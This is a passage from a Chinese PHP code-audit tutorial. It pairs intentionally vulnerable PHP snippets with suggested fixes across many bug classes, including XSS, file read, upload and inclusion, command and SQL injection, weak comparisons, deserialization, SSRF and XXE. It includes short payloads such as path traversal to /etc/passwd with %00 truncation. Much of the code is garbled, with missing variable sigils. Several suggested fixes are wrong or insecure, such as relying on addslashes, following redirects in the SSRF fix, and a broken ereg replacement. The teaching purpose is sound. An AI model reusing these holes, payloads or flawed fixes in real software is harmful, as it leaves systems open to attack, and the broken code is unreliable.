使用了htmlspecialchars进行过滤，但单引号没有过滤，导致DOMXSS修复建议：在接收输入后进行htmlspecialchars过滤，并且还有对单引号和反斜杠进行转义建议修复代码： 1img = isset(GET['img']) ? htmlspecialchars(addslashes($GET['img'])) : 'default.jpg'; 漏洞代码2: 123456789&lt; ?phpcontent = isset(GET['content']) ? htmlspecialchars($GET['content']) : '无内容';content = str_replace(\"'\", \"\\'\", content);? &gt;&lt;div id = \"content\" &gt; 这是测试内容 123456789&lt; /div&gt;&lt;script&gt;var test = document.getElementById('content');test.innerHTML = '&lt;?php echo $content;?&gt;';&lt;/script &gt; innerHTML、documen.write这种直接修改html内容的方法，应对其内容进行严格过滤，否则通过8进制或16进制编码可绕过htmlspecialchars过滤建议修复代码： 1$content = isset($_GET['content']) ? htmlspecialchars(addslashes($_GET['content'])) : '无内容'; 1.文件漏洞2.1文件读取漏洞0x01漏洞背景任意文件读取漏洞，是web安全里高危的漏洞，它可以泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。 0x02漏洞代码及分析漏洞代码1： 12345&lt; ?phptemplate = isset(GET['template']) ? $GET['template'] : 'index.html';file = file_get_contents('2.1/'.template);echo $file;? &gt; 未对../进行过滤，导致可以跨目录读取文件。未对后缀名进行限制，导致可以读取php文件内容。修复建议： payload： 1?template=../../../../etc/passwd 不允许..等跨目录字符出现，使用addslashes防止%00截断，且限制后缀白名单建议修复代码： 1234567891011template = isset(GET['template']) ? addslashes($GET['template']) : 'index.html';if (strstr(template, '..') || substr(template, -5, 5) != '.html')&#123; echo '输入不合法'; exit;&#125; 漏洞代码2： 123456789101112131415&lt; ?php action = isset(GET['action']) ? $GET['action'] : 'login'; fp = \"./2.1/\".action.\"/index.html\"; f = fopen(fp, 'r'); strout = fread(f, filesize($fp)); fclose($f); echo $strout;? &gt; 未对../进行过滤，导致可以跨目录读取文件。未过滤%00字节，在&lt;PHP5.3.4版本中，可在截断后自定义路径和文件名 payload: 1?action=../../../etc/passwd%00 修复建议： 不允许..等跨目录字符出现，使用addslashes防止%00截断建议修复代码： 1234567891011action = isset(GET['action']) ? addslashes($GET['action']) : 'login';if (strstr($template, '..'))&#123; echo '输入不合法'; exit;&#125; 2.2文件上传漏洞0x01漏洞背景上传文件的时候，如果服务器端脚本语言，未对上传的文件进行严格的验证和过滤，就有可能上传恶意的脚本文件，从而控制整个网站，甚至是服务器。0x02漏洞代码及分析漏洞代码1： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt; ?phpif (isset($_FILES['file']))&#123; if ((_FILES[\"file\"][\"type\"] == \"image/gif\" || FILES \"file\" == \"image/jpeg\" || $FILES \"file\" == \"image/pjpeg\") &amp;&amp; $_FILES if ($_FILES \"file\" &gt; 0) &#123; echo \"Return Code: \".$_FILES \"file\".\"&lt;br /&gt;\"; &#125; else &#123; echo \"Upload: \".$_FILES \"file\".\"&lt;br /&gt;\"; echo \"Type: \".$_FILES \"file\".\"&lt;br /&gt;\"; echo \"Size: \".$_FILES \"file\" / 1024.\" Kb&lt;br /&gt;\"; echo \"Temp file: \".$_FILES \"file\".\"&lt;br /&gt;\"; if (file_exists(\"2.2/upload/\".$_FILES \"file\")) &#123; echo $_FILES \"file\".\" already exists. \"; &#125; else &#123; move_uploaded_file(_FILES[\"file\"][\"tmp_name\"], \"2.2/upload/\"._FILES \"file\"); echo \"Stored in: \".\"2.2/upload/\".$_FILES \"file\"; &#125; &#125;&#125; else &#123; echo \"Invalid file\";&#125;&#125;? &gt; 仅对Content-type验证，因为Content-type可以伪造导致可以绕过限制图片验证，导致任意文件上传修复建议：对后缀进行校验，采用白名单模式。保存文件名采用随机文件名+后缀的方式保存建议修复代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt; ?phpif (isset($_FILES['file']))&#123; ext = substr(FILES \"file\", strrpos($FILES \"file\", '.') + 1); filename = time().rand(100, 999).'.'.ext; if ((ext == \"jpg\" || ext == \"jpeg\" || ext == \"png\") &amp;&amp; _FILES \"file\" &lt; 20000) &#123; if ($_FILES \"file\" &gt; 0) &#123; echo \"Return Code: \".$_FILES \"file\".\"&lt;br /&gt;\"; &#125; else &#123; echo \"Upload: \".$_FILES \"file\".\"&lt;br /&gt;\"; echo \"Type: \".$_FILES \"file\".\"&lt;br /&gt;\"; echo \"Size: \".$_FILES \"file\" / 1024.\" Kb&lt;br /&gt;\"; echo \"Temp file: \".$_FILES \"file\".\"&lt;br /&gt;\"; if (file_exists(\"2.2/upload/\".$filename)) &#123; echo $filename.\" already exists. \"; &#125; else &#123; move_uploaded_file(_FILES[\"file\"][\"tmp_name\"], \"2.2/upload/\".filename); echo \"Stored in: \".\"2.2/upload/\".$filename; &#125; &#125; &#125; else &#123; echo \"Invalid file\"; &#125;&#125;? &gt; 漏洞代码2 1234567891011121314151617181920212223242526&lt; ?phpimageinfo = getimagesize(_FILES 'userfile');if (imageinfo['mime'] != 'image/gif' &amp;&amp; imageinfo['mime'] != 'image/jpeg') &#123; echo \"Sorry, we only accept GIF and JPEG images\\n\"; exit;&#125;$uploaddir = '2.2/upload/';uploadfile = uploaddir.basename($_FILES 'userfile');if (move_uploaded_file(_FILES['userfile']['tmp_name'], uploadfile)) &#123; echo \"File is valid, and was successfully uploaded.\\n\";&#125; else &#123; echo \"File uploading failed.\\n\";&#125;? &gt; 仅通过读取文件头判断文件类型，可被绕过；后缀名未进行校验，导致任意文件上传、修复建议：参考漏洞代码1的修复方式漏洞代码3 123456789101112131415161718192021222324252627282930&lt; ?php$blacklist = array(\".php\", \".phtml\", \".php3\", \".php4\");foreach(blacklist as item) &#123; if (preg_match(\"/&#123;item&#125;\\$/i\", _FILES 'userfile')) &#123; echo \"We do not allow uploading PHP files\\n\"; exit; &#125;&#125;$uploaddir = '2.2/upload/';uploadfile = uploaddir.basename($_FILES 'userfile');if (move_uploaded_file(_FILES['userfile']['tmp_name'], uploadfile)) &#123; echo \"File is valid, and was successfully uploaded.\\n\";&#125; else &#123; echo \"File uploading failed.\\n\";&#125;? &gt; 扩展名黑名单过滤不严，可上传.php5文件进行绕过。导致任意文件上传修复建议：参考漏洞代码1的修复方式 2.3文件写入漏洞0x01漏洞背景在生成配置文件或者缓存文件的时候，未对传入的内容进行过滤，导致php代码执行漏洞0x02漏洞代码及分析漏洞代码1： 123456789101112131415161718&lt; ?phpif (isset(_POST['debug']))&#123; setting = _POST['debug']; $content = \"&lt;?php\\r\\n\"; content. = \"\\$YCF['debug'] = '\".setting.\"';\\r\\n\"; $content. = \"?&gt;\"; file_put_contents(\"2.3/config.php\", $content);&#125;? &gt; 未对传入内容进行任何过滤，用单引号绕出去可以引起代码执行漏洞修复建议：进行addslashes函数过滤。且不要拼接在双引号内，否则同样会引起代码执行漏洞建议修复代码： 1$setting = addslashes($_POST['debug']); 2.4文件删除漏洞0x01漏洞背景删除文件时对路径或文件名过滤不严，会导致任意文件删除 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920&lt; ?phpif (@$_GET['action'] == 'del')&#123; if (isset($_GET['img'])) &#123; img = _GET['img']; unlink('2.4/'.$img); echo '删除图片成功'; &#125;&#125;? &gt; 对删除文件过滤不严，导致任意文件删除。修复建议：不允许..等跨目录字符出现。进行addslashes函数过滤建议修复代码： 1234567891011img = addslashes(_GET['img']);if(strstr($img, '..'))&#123;echo '输入不合法';exit;&#125; 3.1文件包含漏洞0x01漏洞背景如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。通常是由于include、require引起恶意包含0x02漏洞代码及分析漏洞代码1： 12345678910111213&lt; ?phpif ($_GET['func']) &#123; include $_GET['func'];&#125; else &#123; include '3.1/default.php';&#125;? &gt; 在未过滤的情况下，可包含带有恶意代码的JPG文件、日志文件，甚至可以远程包含修复建议：不允许..等跨目录字符出现，对前缀跟后缀都进行限制，使用addslashes过滤%00防止被截断包含建议修复代码： 12345678910111213141516171819202122232425&lt; ?phpif ($_GET['func']) &#123; file = addslashes(_GET['func']); if (strstr($file, '..')) &#123; echo '输入不合法'; exit; &#125; include '3.1/'.$file.'.php';&#125; else &#123; include '3.1/default.php';&#125;? &gt; 3.2 preg_replace漏洞0x01漏洞背景preg_replace /e 修正符使 preg_replace() 将 replacement 参数当作 PHP代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法 的 PHP代码字符串，否则 PHP会在报告在包含 preg_replace()的行中出现语法解析错误。 0x02漏洞代码及分析漏洞代码1： 12345678910111213141516171819&lt; ?phpecho preg_replace(\"/test/e\", $_GET[\"h\"], \"jutst test\");? &gt;漏洞代码2：&lt; ?phpfunction test($str)&#123;&#125;echo preg_replace(\"/sphp[/php]s/ies\", 'test(\"\\1\")', $_GET[\"h\"]);? &gt; 语法不当的情况下，会导致代码执行漏洞修复建议： 避免使用/e模式，第一、二个参数不让用户可控。第二个参数单引号改成双引号建议修复代码： 1echo preg_replace(\"/sphp[/php]s/ies\", \"test('\\1')\", $_GET[\"h\"]); 3.3回调漏洞0x01漏洞背景在PHP一些回调函数中，如果函数输入可控，可以利用回调assert等方法进行命令执行漏洞0x02漏洞代码及分析 漏洞代码1： 123456789101112131415&lt; ?phpcall_user_func(_REQUEST['fun'], _REQUEST['pass']);? &gt; 漏洞代码2： &lt; ?phparray_map(_REQUEST['fun'], _REQUEST['pass']);? &gt; 在fun传递可控的情况下，会引起代码执行漏洞 修复建议： 第一个参数不让用户可控 建议修复代码：array_map(‘addslashes’, $_REQUEST[‘pass’]);参考文章：https://www.leavesongs.com/penetration/php-callback-backdoor.html 4.1命令执行漏洞0x01漏洞背景exec、system、shell_exec、passthru等命令执行函数，在传入的命令过滤不严，可导致任意命令执行漏洞，危及服务器。 0x02漏洞代码及分析漏洞代码1： 123456789&lt; ?phpurl = _GET[&apos;url&apos;];content = system(&quot;curl url&quot;);echo $content;? &gt; 直接将可控内容带入命令执行中，导致产生漏洞漏洞代码2： 1234567891011121314151617181920212223242526272829303132333435363738&lt; ?phpif (isset($_REQUEST[&apos;ip&apos;])) &#123; target = trim(_REQUEST[&apos;ip&apos;]); $substitutions = array( &apos;&amp;&apos; = &gt;&apos;&apos;, &apos;;&apos; = &gt;&apos;&apos;, &apos;|&apos; = &gt;&apos;&apos;, &apos;-&apos; = &gt;&apos;&apos;, &apos;$&apos; = &gt;&apos;&apos;, &apos;(&apos; = &gt;&apos;&apos;, &apos;)&apos; = &gt;&apos;&apos;, &apos;`&apos; = &gt;&apos;&apos;, &apos;||&apos; = &gt;&apos;&apos;, ); target = str_replace(array_keys(substitutions), substitutions, target); cmd = shell_exec(&apos;ping -c 4 &apos;.target); echo $target; echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;? &gt; 虽然进行了一些过滤，但是过滤不严，%0a可绕过命令执行修复建议：不要让用户可控的内容带入命令执行中参考文章：http://www.freebuf.com/articles/web/137923.html 5.1普通注入漏洞0x01漏洞背景SQL注入是攻击者通过把恶意SQL命令插入到Web表单的输入域或页面请求的查询字符串中，来达到欺骗服务器执行恶意的SQL命令的一种攻击方式0x02漏洞代码及分析 漏洞代码1： 123456789101112131415161718192021222324&lt; ?php$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;); //数据库连接id = !empty(GET[&apos;id&apos;]) ? $GET[&apos;id&apos;] : &apos;1&apos;;data = mysqli - &gt;query(&quot;select content from test where id=$id&quot;);if ($data - &gt;num_rows !== &apos;0&apos;)&#123; arr = data - &gt;fetch_all(); foreach(arr as a) &#123; echo &apos;内容：&apos;.$a[0].&apos;&lt;br&gt;&apos;; &#125;&#125;? &gt; 对于传入的内容未过滤，且SQL拼接的时候没有单引号保护 修复建议：使用单引号保护并过滤内容建议修复代码： 123456789101112131415161718192021222324252627282930id = !empty(GET[&apos;id&apos;]) ? addslashes($GET[&apos;id&apos;]) : &apos;1&apos;;data = mysqli - &gt;query(&quot;select content from test where id=&apos;$id&apos;&quot;);漏洞代码2：&lt; ?php$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;); //数据库连接id = !empty(GET[&apos;id&apos;]) ? $GET[&apos;id&apos;] : &apos;1&apos;;data = mysqli - &gt;query(&quot;select content from test where id=&apos;$id&apos;&quot;);if ($data - &gt;num_rows !== &apos;0&apos;)&#123; arr = data - &gt;fetch_all(); foreach(arr as a) &#123; echo &apos;内容：&apos;.$a[0].&apos;&lt;br&gt;&apos;; &#125;&#125;? &gt; 即使使用了单引号保护，但是传入内容未过滤，导致SQL注入修复建议：参考代码1修复 漏洞代码3： 1234567891011121314151617181920212223242526&lt; ?php$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;); //数据库连接if (!empty($_POST[&apos;content&apos;]))&#123; name = _POST[&apos;name&apos;]; content = _POST[&apos;content&apos;]; if (mysqli - &gt;query(&quot;insert into test (content)values(&apos;name&apos;,&apos;$content&apos;)&quot;)) &#123; echo &apos;发言成功&apos;; &#125; else &#123; echo &apos;发言失败&apos;; &#125;&#125;? &gt; insert型注入，差不多的注入方式。修复建议： 对SQL拼接时一定要单引号保护，整数型也不例外，并且传入的值要经过addslashes函数过滤。不过最好的方案还是用PDO预处理修复代码： 12345name = addslashes(_POST[&apos;name&apos;]);content = addslashes(_POST[&apos;content&apos;]);if(mysqli-&gt;query(&quot;insert into test (content)values(&apos;name&apos;,&apos;$content&apos;)&quot;)) 5.2宽字节注入漏洞0x01漏洞背景宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用charactersetclient设置值进行了一次编码 0x02漏洞代码及分析漏洞代码1： 123456789101112131415161718192021222324252627&lt;?php$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;);//数据库连接id = !empty(GET[&apos;id&apos;]) ? addslashes($GET[&apos;id&apos;]) : &apos;1&apos;;$mysqli-&gt;query(&quot;SET NAMES &apos;gbk&apos;&quot;);data = mysqli-&gt;query(&quot;select content from test where id=&apos;$id&apos;&quot;);if($data-&gt;num_rows !== &apos;0&apos;)&#123;arr = data-&gt;fetch_all();foreach(arr as a)&#123;echo &apos;内容：&apos;.$a[0].&apos;&lt;br&gt;&apos;;&#125;&#125;?&gt; 执行SET NAMES ‘gbk’之后会引起宽字节注入漏洞，绕过单引号达到注入效果修复建议：字符集编码设置成utf8建议修复代码：$mysqli-&gt;query(“SET NAMES ‘utf8’”); 5.3字符集漏洞0x01漏洞背景默认情况下，Mysql的字符集就是latin1，Mysql字段的字符集和php mysqli客户端设置的字符集不相同导致可能绕过登录等情况0x02漏洞代码及分析漏洞代码1： 12345678910111213141516171819202122232425262728293031&lt;?php$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;);//数据库连接if(!empty(_POST[&apos;username&apos;]) &amp;&amp; !empty(_POST[&apos;password&apos;]))&#123;username = addslashes(_POST[&apos;username&apos;]);password = addslashes(_POST[&apos;password&apos;]);data = mysqli-&gt;query(&quot;select * from user where username=&apos;username&apos; and password=&apos;password&apos;&quot;);if($data-&gt;num_rows !== &apos;0&apos;)&#123;arr = data-&gt;fetch_row();session_start();_SESSION[&apos;username&apos;] = arr[1];echo &apos;登录成功&apos;;&#125;&#125;?&gt; 例如管理员账号是admin，注册admin%c2，登录之后就是管理员权限了修复建议：将数据库字符集修改为utf8参考文章：https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html 6.1 hash比较绕过0x01漏洞背景===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较==在进行比较的时候，会先将字符串类型转化成相同，再比较如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt; ?phpif (isset(_GET[&apos;Username&apos;]) &amp;&amp; isset(_GET[&apos;password&apos;])) &#123; $logined = true; Username = _GET[&apos;Username&apos;]; password = _GET[&apos;password&apos;]; if (!ctype_alpha($Username)) &#123; $logined = false; &#125; if (!is_numeric($password)) &#123; $logined = false; &#125; if (md5(Username) != md5(password)) &#123; $logined = false; &#125; if ($logined) &#123; echo &quot;successful&quot;; &#125; else &#123; echo &quot;login failed!&quot;; &#125;&#125;? &gt; 0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。导致弱类型比较绕过修复建议： 将 ==换成 ===建议修复代码：if (md5($Username) !== md5($password)) { 6.2 json绕过0x01漏洞背景===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较==在进行比较的时候，会先将字符串类型转化成相同，再比较如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 0x02漏洞代码及分析漏洞代码1： 12345678910111213141516171819202122232425&lt; ?phpif (isset($_POST[&apos;message&apos;])) &#123; message = json_decode(_POST[&apos;message&apos;]); $key = &quot;*****&quot;; if (message - &gt;key == key) &#123; echo &quot;flag&quot;; &#125; else &#123; echo &quot;fail&quot;; &#125;&#125; else &#123; echo &quot;~~~~&quot;;&#125;? &gt; json_decode之后可以解析成布尔型，可以传入true绕过比较修复建议：将 ==换成 ===建议修复代码：if ($message-&gt;key === $key) { 6.3 array_search绕过0x01漏洞背景===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较==在进行比较的时候，会先将字符串类型转化成相同，再比较如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920212223242526272829303132333435&lt; ?phpif (!is_array($_GET[&apos;test&apos;])) &#123; exit;&#125;test = _GET[&apos;test&apos;];for (i = 0; i &lt; count(test); i++) &#123; if (test[i] === &quot;admin&quot;) &#123; echo &quot;error&quot;; exit; &#125; test[i] = intval(test[i]);&#125;if (array_search(&quot;admin&quot;, $test) === 0) &#123; echo &quot;flag&quot;;&#125; else &#123; echo &quot;false&quot;;&#125;? &gt; 传入数组test[]=0可以绕过修复建议：将array_search第三个参数为true则就不能绕过建议修复代码：if (array_search(“admin”, $test, true) === 0) { 6.4 strcmp绕过0x01漏洞背景===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较==在进行比较的时候，会先将字符串类型转化成相同，再比较如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 0x02漏洞代码及分析漏洞代码1： 123456789101112131415161718192021&lt; ?php$password = &quot;*******&quot;;if (isset($_POST[&apos;password&apos;])) &#123; if (strcmp(_POST[&apos;password&apos;], password) == 0) &#123; echo &quot;Right!!!login success&quot;; exit; &#125; else &#123; echo &quot;Wrong password..&quot;; &#125;&#125;? &gt; 在PHP&lt;5.3的情况下，password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等修复建议： 不建议使用该函数 7.1变量覆盖漏洞0x01漏洞背景变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617&lt; ?php$auth = &apos;0&apos;;extract($_GET);if ($auth == 1) &#123; echo &quot;private!&quot;;&#125; else &#123; echo &quot;public!&quot;;&#125;? &gt; 将可控的数组变量解析，导致变量覆盖漏洞修复建议：不要将用户可控的数据进行变量解析漏洞代码2： 123456789&lt;?php$var='init';parse_str($_SERVER['QUERY_STRING']);print $var;?&gt; parse_str将字符串解析成多个变量，导致变量覆盖漏洞修复建议：不要将用户可控的数据进行变量解析漏洞代码3： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php$magic_quotes_gpc = ini_get('magic_quotes_gpc');function _FilterAll(fk, &amp;svar)&#123;global cfg_notallowstr, cfg_replacestr;if (is_array($svar)) &#123;foreach (svar as k =&gt; $v) &#123;svar[k] = _FilterAll(fk, v);&#125;&#125; else &#123;if (cfg_notallowstr != '' &amp;&amp; preg_match(\"#\" . cfg_notallowstr . \"#i\", $svar)) &#123;ShowMsg(\" &#123;$fk&#125; has not allow words!\", '-1');exit;&#125;if ($cfg_replacestr != '') &#123;svar = preg_replace('/' . cfg_replacestr . '/i', \"***\", $svar);&#125;&#125;if (!$magic_quotes_gpc) &#123;svar = addslashes(svar);&#125;return $svar;&#125;?&gt; 该片段取自于dedecms变量覆盖漏洞 7.2 IP伪造漏洞0x01漏洞背景header里CLIENT-IP与X-FORWARDED-FOR都是可以用随意伪造的，当这些值未经处理直接用，会导致XSS、SQL注入等漏洞 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt; ?phpfunction getIP() &#123; if (getenv('HTTP_CLIENT_IP')) &#123; $ip = getenv('HTTP_CLIENT_IP'); &#125; elseif(getenv('HTTP_X_FORWARDED_FOR')) &#123; $ip = getenv('HTTP_X_FORWARDED_FOR'); &#125; elseif(getenv('HTTP_X_FORWARDED')) &#123; $ip = getenv('HTTP_X_FORWARDED'); &#125; elseif(getenv('HTTP_FORWARDED_FOR')) &#123; $ip = getenv('HTTP_FORWARDED_FOR'); &#125; elseif(getenv('HTTP_FORWARDED')) &#123; $ip = getenv('HTTP_FORWARDED'); &#125; else &#123; ip = _SERVER['REMOTE_ADDR']; &#125; return $ip;&#125;echo getIP();? &gt; 修复建议：对传入内容进行addslashes和htmlspecialchars过滤建议修复代码：return addslashes($ip); 7.3编码绕过0x01漏洞背景一般程序带有全局addslashes过滤，但是后面又对传入内容进行解码，解码之后内容没有进行过滤 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920212223&lt; ?php$mysqli = new mysqli('localhost', 'root', 'root', 'code'); //数据库连接if (!empty($_POST['username']))&#123; username = base64_decode(addslashes(_POST['username'])); data = mysqli - &gt;query(\"select * from user where username='$username'\"); if ($data - &gt;num_rows !== '0') &#123; arr = data - &gt;fetch_row(); //.... &#125;&#125;? &gt; 虽然对POST传入内容过滤，可经过二次编码绕过过滤修复建议：在解码之后再进行一次字符串过滤建议修复代码： 1username = addslashes(base64_decode(addslashes(_POST['username']))); 7.4反序列化漏洞0x01漏洞背景php反序列化漏洞又称对象注入，调用某一类并执行魔术方法(magic method)，之后可以执行类中函数，产生安全问题 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920212223242526272829303132333435&lt; ?phpclass test&#123; public $username = ''; public $password = ''; public $file = ''; public function out() &#123; echo \"username: \".this - &gt;username.\"&lt;br&gt;\".\"password: \".this - &gt;password; &#125; public function __toString() &#123; return file_get_contents($this - &gt;file); &#125;&#125;unserialize($_POST['str']);? &gt; test类的魔术方法中存在可以利用的地方，通过反序列化漏洞可以控制变量，达到写入文件的效果修复建议：如果代码中有反序列化，不要在类的魔术方法中进行敏感操作 7.5截断漏洞0x01漏洞背景PHP&lt;5.3.4中，%00可截断字符串，在写入文件时截断路径导致任意文件名写入 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617&lt; ?phpif (isset($_GET['password'])) &#123; if (ereg(\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) &#123; echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; &#125; else &#123; echo 'success'; &#125;&#125;? &gt; 这里限制了前缀跟后缀，但是没有过滤../跟%00截断漏洞，导致可以任意文件读取修复建议：不允许..等跨目录字符出现，使用addslashes过滤%00防止被截断包含建议修复代码： 12345678910111213141516171819&lt; ?phpid = addslashes(_GET['id']);if (strstr($id, '..'))&#123; echo '输入不合法'; exit;&#125;file = file_get_contents('upload/'.id.'.txt');echo $file;? &gt; 漏洞代码2： 1234567891011121314151617&lt; ?phpif (isset($_GET['password'])) &#123; if (ereg(\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) &#123; echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; &#125; else &#123; echo 'success'; &#125;&#125;? &gt; ereg函数存在NULL截断漏洞修复建议：停止使用ereg与eregi函数建议修复代码： 1if (preg_replace(\"/[a-zA-Z0-9]+/\", $_GET['password']) === FALSE) &#123; 7.6 hash长度扩展攻击漏洞0x01漏洞背景哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息)此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgard构造的算法均对此类攻击显示出脆弱性。 0x02漏洞代码及分析漏洞代码1： 12345678910111213141516171819202122&lt; ?php$secret = \"XXXXXXXXXXXXXXX\";// This secret is 15 characters long for security!$username = \"admin\";password = _POST[\"password\"];if (COOKIE[\"getmein\"] === md5(secret.urldecode(username.password))) &#123; echo \"Congratulations! You are a registered user.\\n\"; die(\"The flag is \".$flag);&#125; else &#123; die(\"Your cookies don't match up! STOP HACKING THIS SITE.\");&#125;? &gt; 漏洞产生条件是当可控内容拼接在$secret后面，再进行md5加密；且要知道同样是经过$secret加密后的32位md5 修复建议： 将$secret放到后面建议修复代码： 1if (COOKIE[\"getmein\"] === md5(urldecode(username . password). secret)) &#123; 7.7 CSRF跨站请求伪造漏洞0x01漏洞背景​ 在跨站请求伪造（CSRF）攻击里面，攻击者通过用户的浏览器来注入额外的网络请求，来破坏一个网站会话的完整性。而浏览器的安全策略是允许当前页面发送到任何地址的请求，因此也就意味着当用户在浏览他/她无法控制的资源时，攻击者可以控制页面的内容来控制浏览器发送它精心构造的请求。 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920&lt; ?phpinclude 'user.php'; //验证用户登录if ($_GET['act'] == 'newpwd')&#123; newpwd = md5(_POST['newpwd']); sql = \"update user set password='newpwd' where id=$userid\"; mysql_query($sql); mysql_close($conn); echo '修改密码成功';&#125;? &gt; 未对CSRF进行任何防御，可以恶意构造表单，用户触发后可以修改其密码修复建议：验证HTTP Referer字段、在请求地址中添加 token并验证、用XMLHttpRequest附加在header里 7.8 SSRF请求伪造漏洞0x01漏洞背景SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从 外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） 0x02漏洞代码及分析漏洞代码1： 12345678910111213&lt; ?php$ch = curl_init();curl_setopt(ch, CURLOPT_URL, _GET['url']);curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch);? &gt; 未限制URL的协议，恶意使用其他协议可导致源码泄露、内网泄露等漏洞；如果使用了CDN，请求http会泄露源站IP修复建议：限制协议为HTTP、HTTPS；禁止30x跳转建议修复代码： 12345678910111213141516171819202122232425&lt; ?phpurl = _GET['url'];if (strpos(url, 'http://') === false &amp;&amp; strpos(url, 'https://') === false)&#123; exit('请求链接不合法');&#125;$ch = curl_init();curl_setopt(ch, CURLOPT_URL, url);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch);? &gt; 7.9伪随机数漏洞0x01漏洞背景mt_rand()并不是一个真·随机数生成函数,实际上绝大多数编程语言中的随机数函数生成的都都是伪随机数。伪随机是由可确定的函数（常用线性同余），通过一个种子（常用时钟），产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920212223242526272829303132333435&lt; ?phpfunction wp_generate_password(length = 12, special_chars = true)&#123; $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; if ($special_chars) &#123; chars. = '!@#%^&amp;*()'; &#125; $password = ''; for (i = 0; i &lt; length; i++) &#123; password. = substr(chars, mt_rand(0, strlen($chars) - 1), 1); &#125; return $password;&#125;$key = wp_generate_password(16, false);echo \"[*] This is a key for public:\".$key.\"\\n\";$private = wp_generate_password(10, false);echo \"[*] Create a private key which you don't know:\".$private.\"\\n\";? &gt; 如果没有mt_srand()给随机数发生器播种，mt_rand会使用一个随机生成的固定种子，如果知道$key的情况下，可以预测出$private。修复建议：mt_rand之前进行随机播种。mt_srand((double)microtime()*1000000);建议修复代码： 12345678910111213141516171819202122232425function wp_generate_password(length = 12, special_chars = true)&#123; mt_srand((double) microtime() * 1000000); $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; if ($special_chars) &#123; chars. = '!@#%^&amp;*()'; &#125; $password = ''; for (i = 0; i &lt; length; i++) &#123; password. = substr(chars, mt_rand(0, strlen($chars) - 1), 1); &#125; return $password;&#125; 7.10 XXE漏洞0x01漏洞背景XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题. 0x02漏洞代码及分析漏洞代码1： 123456789&lt; ?php$xml = @file_get_contents('php://input');data = simplexml_load_string(xml);print_r($data);? &gt; simplexml_load_string函数读取XML会引起XXE漏洞，导致任意文件读取、命令执行漏洞修复建议：使用XMLReader或DOM方式解析XML建议修复代码： 123456789&lt; ?php$xml = @file_get_contents('php://input');data = XMLReader: :xml(xml, 'UTF-8', LIBXML_NONET);print_r($data);? &gt;","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://shackles.top/tags/代码审计/"}]},{"title":"FengCms1.32 重装漏洞","slug":"FengCms1.32 